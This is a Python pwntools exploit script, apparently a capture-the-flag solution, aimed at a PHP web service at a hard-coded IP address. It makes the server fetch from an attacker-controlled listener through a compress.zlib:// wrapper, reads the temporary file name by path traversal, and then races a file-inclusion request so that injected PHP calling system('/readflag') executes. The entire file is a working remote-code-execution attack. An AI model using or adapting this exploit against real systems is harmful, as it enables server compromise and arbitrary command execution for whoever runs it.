from pwn import *
import requests
import re
import threading
import time

for gg in range(100):

    r = remote("78.47.165.85", 8004)
    l = listen(5278)

    payload = '''POST / HTTP/1.1
Host: 78.47.165.85:8004
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Length: 8098
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1

name={}&file=compress.zlib://http://kaibro.tw:5278'''.format("a"*8050).replace("\n","\r\n")


    r.send(payload)
    r.recvuntil("your sandbox: ")
    dirname = r.recv(70)

    print("[DEBUG]:" + dirname)

    # send trash
    c = l.wait_for_connection()
    resp = '''HTTP/1.1 200 OK
Date: Sun, 29 Dec 2019 05:22:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 534
Content-Type: text/html; charset=UTF-8

AAA
BBB'''.replace("\n","\r\n")
    c.send(resp)


    # get filename
    r2 = requests.get("http://78.47.165.85:8004/.well-known../"+ dirname + "/")
    tmpname = "php" + re.findall(">php(.*)<\/a",r2.text)[0]
    print("[DEBUG]:" + tmpname)

    def job():
        time.sleep(0.26)
        phpcode = 'wtf<?php system("/readflag");?>';
        c.send(phpcode)

    t = threading.Thread(target = job)
    t.start()

    # file_get_contents and include tmp file
    exp_file = dirname + "/" + tmpname
    print("[DEBUG]:"+exp_file)
    r3 = requests.post("http://78.47.165.85:8004/", data={'file':exp_file})
    print(r3.status_code,r3.text)
    if "wtf" in r3.text:
        break

    t.join()
    r.close()
    l.close()
    #r.interactive()
